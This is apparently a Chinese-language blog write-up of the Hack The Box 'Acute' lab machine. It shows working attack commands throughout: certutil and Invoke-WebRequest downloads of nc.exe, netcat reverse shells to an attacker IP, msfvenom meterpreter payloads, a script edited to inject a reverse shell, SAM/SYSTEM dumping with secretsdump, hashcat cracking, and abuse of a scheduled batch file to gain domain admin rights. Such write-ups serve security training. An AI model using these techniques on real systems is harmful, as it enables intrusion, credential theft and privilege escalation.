+++
date = '2025-07-23T10:01:38+08:00'
draft = false
title = 'HTB Acute'
+++

Acute是Hackthebox困难难度的靶机，本身并没有什么特别复杂或者特殊的利用方式，需要进行详细的枚举，综合评估得到的信息。首先通过web页面得到一个docx文档，通过文档得到了初始立足点所需要的所有信息，得到立足点后，经过尝试发现存在杀软不检查的目录，从而得到了执行winpeas的可能，winpeas的结果显示存在RDP连接，至此，`msfvenom`生成一个`payload`，通过`meterpreter`得到shell，然后通过msf的后渗透模块截屏，从而得到第一个`pscredential`。测试winrm是正常的，但是实际调用的时候无法正常通过`Enter-PSSession`拿到`powershell`，转而尝试使用`invoke-command`，找到一个ps1脚本，通过替换脚本中的内容，调用nc从而得到另一个用户的shell，查看权限发现这个用户是本地的管理员用户，那么可以拿到sam和system，使用msf下载文件，impacket-secretsdump本地破解NT哈希，再拿到第二个密码后尝试更换用户名，使用这个密码登录PSWA，都没能成功，转而使用这个密码更换用户名，尝试调用invoke-command命令。最终成功得到了另一个用户的命令执行能力。这里又是不断的枚举，在`program files`这个常规的windows安装软件的目录中找到可以利用的点，从而通过bat脚本结合`net group`的信息，以及之前的docx文件的信息，综合判断下，将用户添加进一个高权限的用户组，从而读取到root.txt

总的来说，这台靶机的难度在于枚举是否仔细，对于已拥有的信息是否进行合理的管理和判断，以及对于Windows用户、用户组，权限的了解。以及对于powershell的一些基本使用，如果本身对于windows的利用经验比较少，那么这台靶机的难度是比较大的.
### Recon

```bash
# Nmap 7.95 scan initiated Sun Jul 13 05:47:55 2025 as: /usr/lib/nmap/nmap -sT -p 443 -sC -sV -O -oA nmapscan/details 10.10.11.145
Nmap scan report for 10.10.11.145
Host is up (0.072s latency).

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
|_ssl-date: 2025-07-13T09:25:09+00:00; -23m09s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -23m09s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 13 05:48:18 2025 -- 1 IP address (1 host up) scanned in 23.01 seconds
```

根据详细扫描的结果将域名添加到hosts文件中

`sed -i '1i 10.10.11.145 atsserver.acute.local acute.local'`

### PSWA(Windows PowerShell Web Access)

在about页面下载到`New_Starter_CheckList_v7.docx`文件，文件中存在一个默认密码`Password1!`

```txt
IT overview
Arrange for the new starter to receive a demonstration on using IT tools which may include MUSE, myJob and Google accounts. Walk the new starter through the password change policy, they will need to change it from the default Password1!. Not all staff are changing these so please be sure to run through this.
```

在`Initial Probation Meeting`一栏当中提到`PSWA`，并且提到sessions名称是`dc_manage`

```txt
Initial Probation Meeting (For Academic staff on Probation only)

Arrange initial probation meeting between Probationer, Head of Department and Probation Adviser.

Run through the new PSWA to highlight the restrictions set on the sessions named dc_manage.

The probation plan should be completed within a month of the start date and should include a requirement to register with LETs re: rate to gain within 3 months of starting. Fellowship of the Higher Education Academy (FHEA).
```

`Induction meetings with management staff`当中提到一个用于远程培训的地址`https://atsserver.acute.local/Acute_Staff_Access`，是一个PSWA的登录界面

```txt
Induction meetings with management staff

Arrange for the new starter to meet with other staff in the department as appropriate. This could include the Head of Department and/or other members of the appointee’s team. Complete the [remote](https://atsserver.acute.local/Acute_Staff_Access) training
```

exiftool查看一下docx文档的元数据，存在一些敏感信息.

```bash
exiftool *.docx
Creator: FCastle
Description: Created on Acute-PC01
Last Modified By: Daniel
```

docx的元数据表现了可能的用户名形式 `FCastle`  以及可能的hostname `Acute-PC01`

#### 综合一下可利用的信息

```txt
awallace
chall
edavies
imonks
jmorgan
lhopkins

Password1!

Acute-PC01
```

内容并不多，直接手工尝试，找到可用于登录的凭证:

```txt
Username: edavies
Password: Password1!
ComputerName: Acute-PC01
```

#### chisel转发

尝试以winrm登录，没有成功

```bash
chisel server -p 8000 --reverse
```

```powershell
.\chisel.exe client 10.10.14.9:8000 R:5985:127.0.0.1:5985
```

#### 尝试运行反弹shell脚本

```bash
certutil.exe -urlcache -split -f http://10.10.14.9/Invoke-PowerShellTcp.ps1 c:\programdata\Invoke-PowerShellTcp.ps1 
```

执行脚本时提醒被杀毒软件杀掉，并且一段时间之后直接被断掉连接，再次登录到PSWA之后能看到之前上传的脚本被杀掉了。


#### 直接上传nc并执行得到反弹shell

在随意翻目录的时候看到utils这个文件夹，里面内容有`chisel,exe`，`runascs.exe`，`Invoke-PortScan.ps1`，事实上并不是我本身上传的文件，可能这也是一个提示信息，表示这个文件夹可能是没有受到防护软件，比如`Windows defender`这类软件保护的。

查看一下这个目录中的隐藏文件

```powershell
get-childitem -force -Attributes Hidden -file
```

- -file: 只显示隐藏文件
```txt
[.ShellClassInfo]
InfoTip=Directory for Testing Files without Defender
```

通过注册表交叉验证

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

可以看到提示`utils`这个文件夹是例外的。

##### 调用invoke-portscan.ps1

```powershell
$content = Get-Content .\invoke-portscan.ps1
$content[0..($content.Count - 3)] | Set-Content .\invoke-portscan.ps1
```

这里想写入一下执行命令到invoke-portscan.ps1脚本，但是powershell中`Out-File -Append`或者`Add-Content`默认都会添加换行符，即使加上`-NoNewline`也会非预期的加入换行符，需要通过`.NET`流操作

```powershell
$path = "Invoke-portscan.ps1"
$data = "Invoke-PortScan -StartAddress 172.16.22.2 -EndAddress 172.16.22.2 -ScanPort"

$stream = [System.IO.File]::Open($path, 'Append', 'Write')
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($data)  # 不加换行
$writer.Close()
```

但是突然想到一个问题，直接上传nc然后执行还没有试过，结果直接执行竟然直接成功了.............中间折腾ps1，chisel转发winrm之类的整了半天.......

```powershell
Invoke-WebRequest -Uri "http://10.10.14.9/nc.exe" -OutFile "nc.exe" -UseBasicParsing
```

```powershell
.\nc.exe 10.10.14.9 4444 -e powershell.exe
```

#### msfconsole

这里load powershell没成功执行，可以先执行`shell`，再执行`powershell`

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.9
run
load powershell
shell
powershell
```

这里尝试了多种方式没找到太多的可以利用的点，实在是不行了winpeas自动枚举一下

```powershell
͹ Looking for possible password files in users homes                                         
  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml            
    C:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\2.0.0.0\passwords.txt
```

```powershell
ls 'C:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\2.0.0.0\passwords.txt' 
length 271951
```

![[Pasted image 20250721211733.png]]

存在RDP登录，用msf截图一下看看远程桌面在执行什么


#### meterpreter

通过msf得到session之后，使用后渗透模块的进程迁移功能迁移当前进程到`explorer.exe`，再执行`screenshot`，执行`screenshare`的话，大概率很快就会被`defender`拿下

```powershell
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.12 lport=4444 -f exe -o rev.exe

msfconsole
use exploit/multi/handler
run
```

使用msf的后渗透模块进行进程迁移

```bash
bg
use post/windows/manage/migrate
sessions
set session 2 
sessions -i 2

screenshot
```

通过截图看到一个设置`pscredential`的过程

```powershell
$passwd = convertto-securestring "W3_4R3_th3_f0rce." -AsPlainText -Force

$cred = new-object system.management.automation.pscredential ("ACUTE\imonks", $passwd) 

Enter-PSSession ATSSERVER -Credential $cred -ConfigurationName dc_manage
```


#### 通过pscredential调用invoke-command执行命令

总结一下到此得到的信息：

`pscredential`
域控名(通过.docx文档): `dc_manage`
主机名: `ATSSERVER`
用户名: `acute\imonks`
`passwd`: `W3_4R3_th3_f0rce.`

如果已经得到了pscredential，如果凭证所属的主机开启了winrm，可以尝试远程登录powershell会话，通过pscredential验证smb服务从而传输文件，或者使用invoke-command命令执行命令


```powershell

# 测试winrm是否可以登录
Test-WSMan ATSSERVER

wsmid : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd ProductVendor : Microsoft Corporation ProductVersion : OS: 0.0.0 SP: 0.0 Stack: 3.0

$passwd = convertto-securestring "W3_4R3_th3_f0rce." -AsPlainText -Force

$cred = new-object system.management.automation.pscredential ("ACUTE\imonks", $passwd) 

Enter-PSSession ATSSERVER -Credential $cred -ConfigurationName dc_manage

Enter-PSSession : The term 'Measure-Object' is not recognized as the name of a cmdlet, function, script file, or 
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try 
again.
```

直接登陆winrm提示缺少`Measure-Object`，无法直接调用winrm，虽然不能直接winrm登录，但是可以使用`invoke-command`来调用命令

rlwrap得到一个交互性更好的shell

```bash
sudo rlwrap -cAr nc -lvnp 5555
```

```powershell
iwr -uri http://10.10.14.12/nc.exe -outfile nc.exe
.\nc.exe 10.10.14.12 5555 -e cmd.exe
```
##### invoke-command

```powershell
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-command }

# GET User Flag
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { type c:\users\imonks\desktop\user.txt }

invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-childitem -force ..\desktop }
```

在imonks用户的`desktop`中看到一个`wm.ps1`脚本

```powershell
$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

能看到这个脚本里设置了passwd，设置了creds，并且通过jmorgan用户调用命令`Get-Volume`，可以把`Get-Volume`命令替换成反弹shell的命令然后执行这个脚本从而以`jmorgan`用户的身份执行反弹shell

```powershell
Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.6 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

如果要把`C:\utils\nc64.exe -e cmd 10.10.14.24 443`换成`C:\utils\nc.exe -e cmd 10.10.14.24 443`，需要把`C:\utils\nc64.exe -e cmd 10.10.14.24 443`写成`C:\\utils\\nc64.exe -e cmd 10.10.14.24 443`因为powershell的`-replace`使用正则表达式

调用改写之后的wm.ps1脚本，得到`jmorgan`用户的shell

```powershell
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { c:\users\imonks\desktop\wm.ps1 } 
```

#### 提权

jmorgan用户已经是本地管理员用户

```powershell
PS C:\Users\jmorgan\Documents> net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
ACUTE\Domain Admins
ACUTE\jmorgan
Administrator
The command completed successfully.
```

既然已经是管理员账户，直接拿一下sam和system

```powershell
reg save HKLM\sam sam.bak
reg save HKLM\system system.bak
```

直接通过msf控制台将sam和system文件下载到kali即可

```meterpreter
download sam.bak
download system.bak
```

##### impacket-secretsdump + hashcat破解NTML

使用impacket的secretsdump工具拿到hash

```bash
└─$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x44397c32a634e3d8d8f64bff8c614af7
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
[*] Cleaning up...
```

```powershell
.\hashcat.exe .\hashes\hash.sam .\hashes\rockyou.txt

Dictionary cache built:
* Filename..: .\hashes\rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

31d6cfe0d16ae931b73c59d7e0c089c0:
a29f7623fd11550def0192de9246f46b:Password@123
Approaching final keyspace - workload adjusted.
```


通过hashcat破解出了administrator用户的NT哈希`Password@123`

```powershell
awallace
chall
edavies
imonks
jmorgan
lhopkins

Password@123

Acute-PC01

```

PSWA界面用`Password@123`没有用户能成功登录，invoke-command用awallace用户成功执行

```powershell
awallace, Password@123
```

```powershell
PS C:\Users\jmorgan\Documents> invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat "c:\program files\keepmeon\keepmeon.bat" }
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { cat "c:\program files\keepmeon\keepmeon.bat" }

REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)

```

`keepmeon.bat`脚本为Lois用户使用, 每5分钟运行一次

`for /R %%x in (*.bat)`递归查找当前目录以及子目录的所有bat文件

`if not "%%x" == "%~0" call "%%x"`，如果和`%~0`，也就是当前这个bat文件不相同，就调用这个bat文件

这里思路很简单，可以尝试以lois身份将当前用户添加到一个管理员组中，比如之前在docx中看到的

```txt
Lois is the only authorized personnel to change Group Membership, Contact Lois to have this approved and changed if required. Only Lois can become site admin.
```

查看一下当前有哪些组`net group`

```powershell
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group  }

Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Managers
*Protected Users
*Read-only Domain Controllers
*Schema Admins
*Site_Admin
The command completed with one or more errors.

```

`Site_Admin`明显不是一个默认的域用户组，可以具体查看一下这个组

```powershell
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group Site_Admin  }

Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
The command completed successfully.
```

Comment显示只在紧急情况下才需要写入，并且具有Domain Admin group的权限，当前这个组并没有任何成员，可以写一个bat脚本，调用lois的权限，将当前用户加入到Site_Admin这个高权限用户组中.

```powershell
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { set-content -Path "c:\program files\keepmeon\aaa.bat" -Value "net group site_admin awallace /add"}
```

等待片刻之后能看到把当前用户加入到了site_admin组中

```powershell
PS C:\utils> invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group site_admin }
invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { net group site_admin }
Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members

-------------------------------------------------------------------------------
awallace                 
The command completed successfully.
```

这样就可以通过`invoke-command`读取`root flag`了

```powershell
PS C:\utils> invoke-command -computerName ATSSERVER -Credential $cred -ConfigurationName dc_manage -ScriptBlock { get-content c:\users\administrator\desktop\root.txt }
```



















